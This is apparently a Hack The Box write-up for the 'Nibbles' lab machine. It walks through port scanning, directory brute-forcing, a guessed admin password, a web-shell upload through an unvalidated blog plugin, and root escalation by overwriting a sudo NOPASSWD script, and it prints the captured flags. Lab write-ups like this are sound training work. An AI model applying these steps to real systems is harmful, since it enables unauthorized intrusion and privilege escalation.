---
layout: offsec
category: [offsec]
---

![banner](/assets/images/htb/nibbles.png) 
# Nibbles: 10.10.10.75


## Scanning:

<br>

```bash
nmap 10.10.10.75

Starting Nmap 7.01 ( https://nmap.org ) at 2018-05-05 19:14 EDT
Nmap scan report for 10.10.10.75
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.39 seconds
```

<br>

## Gaining Access:

<br>

As always, let's start exploring the HTTP application running on port 80.

![](/assets/images/75_index.html.png)

![](/assets/images/75_index.source.png)

Well, nothing interesting there.. Let's use <a href='https://tools.kali.org/web-applications/dirb'>dirb</a> to bruteforce all common known directories as so `dirb 10.10.10.75/nibbleblog/`


__Note: I created a function for calling dirb:__


_~/.zshrc_
```bash
dirb(){
    echo 'HTTPS'
    echo
    /home/srbz/._bin/dirb/dirb https://$1 /home/srbz/._bin/dirb/wordlists/common.txt
    echo 'HTTP'
    echo
    /home/srbz/._bin/dirb/dirb http://$1 /home/srbz/._bin/dirb/wordlists/common.txt
}
```

Apparently, there's no other way to login than guessing. Hack the box usually use the challenge name as the password. 

`username: admin`

`password: nibbles`

![](/assets/images/75_blog.png)

<br>

## Maintaining Access:

<br>

Once logged in, we can upload files by using the plugin`my_image.` The vulnerability of that plugin is that it does not verrify the file extension. So, I uploaded my <a href='https://github.com/KevinCarroll7737/tools/blob/master/shell.php'>shell.php</a>

![](/docs/assets/images/75_upload.png)

By running <a href='https://github.com/KevinCarroll7737/tools/blob/master/linenum.sh'>linEnum.sh</a>, I've been able to see fast and clearly which files the user `nibbler` had the control of.

```bash
bash linenum.sh

(...)

utching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Ok so we can use `/home/nibbler/personal/stuff/monitor.sh` with sudo without giving password. Let's change what's in this script.

<br>

## Covering Tasks:

<br>

```bash
echo 'cat /root/root.txt > /tmp/srbz.txt; chown nibbler:nibbler /tmp/srbz.txt; chmod 777 /tmp/srbz.txt' >  /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
cat /tmp/srbz.txt
b6d745c0dfb6457c55591efc898ef88c
cat /home/nibbler/user.txt
b02ff32bb332deba49eeaed21152c8d8
```
